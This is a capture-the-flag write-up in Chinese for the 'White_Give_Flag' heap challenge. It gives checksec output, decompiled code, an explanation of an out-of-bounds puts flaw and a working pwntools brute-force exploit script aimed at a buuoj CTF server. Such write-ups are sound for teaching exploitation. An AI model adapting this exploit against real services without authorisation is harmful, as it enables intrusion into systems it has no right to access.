# White_Give_Flag

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## IDA

```c
  v0 = time(0LL);
  srand(v0);
  qword_202120[0] = (__int64)aThereIsNoVulnI;
  qword_202128 = (__int64)aThereIsNoVulnI_0;
  qword_202130 = (__int64)aThereIsNoVulnI_1;
  qword_202138 = (__int64)aThereIsNoVulnI_2;
  qword_202140 = (__int64)aBye;
  s = (char *)malloc(0x200uLL);
  for ( i = 0LL; i < random() % 11 + 5; ++i )
  {
    memset(s, 0, 0x100uLL);
    free(s);
    v1 = random();
    s = (char *)malloc(v1 % 0x201 + 0x300);
    open("./flag", 0);
    read(3, s + 16, 0x26uLL);
    close(3);
  }
  free(s);
```

**main**

```c
void __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v3; // [rsp+Ch] [rbp-4h]

  sub_B1A(a1, a2, a3);
  while ( 1 )
  {
    menu();
    v3 = choice();
    puts((const char *)qword_202120[v3 - 1]);
    switch ( v3 )
    {
      case 1:
        add();
        break;
      case 2:
        show();
        break;
      case 3:
        dele();
        break;
      case 4:
        edit();
        break;
      case 5:
        exit(0);
      default:
        puts("Invalid!");
        exit(0);
    }
  }
}
```

是个不同寻常的堆题，再进入菜单前，申请了随机size为`0x300-0x500`的chunk，并将flag，放到了偏移+0x10的位置。

`v3 = choice();`返回的是读取的字节数，`puts((const char *)qword_202120[v3 - 1]);`这里根据选项将一段字符进行了输出。

`qword_202120`附近是chunk数组的地址，它前面就是chunk[3]。

利用思路是，先随机申请三个小chunk，最后申请一个较大的chunk，这些chunk都是从包含flag的那个chunk中分割出来的，将前面的`\x00`使用`edit`进行填补。之后通过截断输入流使`v3=0`，这样puts就会输出chunk中的内容。进行爆破，若最后申请的chunk正好到flag的位置。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher

leak = lambda name,addr: log.success('{:#x}'.format(name,hex(addr)))
# context.log_level="DEBUG"
context.arch="amd64"

local=0
binary='./White_Give_Flag'
#gdb.attach(p)
# if local:
# 	sh=process(binary)
# else:
# 	sh=remote('node4.buuoj.cn', 39123)

elf = ELF(binary,checksec=False)

def add(size):
    sh.sendlineafter('choice:','')
    sh.sendlineafter('size:',str(size))
    
def show():
	sh.sendlineafter('choice:','2')
 
def dele(index):
    sh.sendlineafter('choice:','33')
    sh.sendlineafter('index:',str(index))
    
def edit(index,content):
    sh.sendlineafter('choice:','444')
    sh.sendlineafter('index:',str(index))
    sh.sendlineafter('Content:',str(content))
    
def exit():
    sh.sendlineafter('choice:','5555')

while True:
	sh=remote('node4.buuoj.cn', 39123)
	add(0x10)
	add(0x10)
	add(0x10)
	add(0x310)
	edit(3,'+'*0x10)
	# sh.recvuntil('choice:')
	sh.shutdown_raw('send')
	flag = sh.recv()
	log.info(flag)
	if 'vnctf{' in flag or '}' in flag:
	 	exit(0)
	sh.close()
	sleep(1)
```

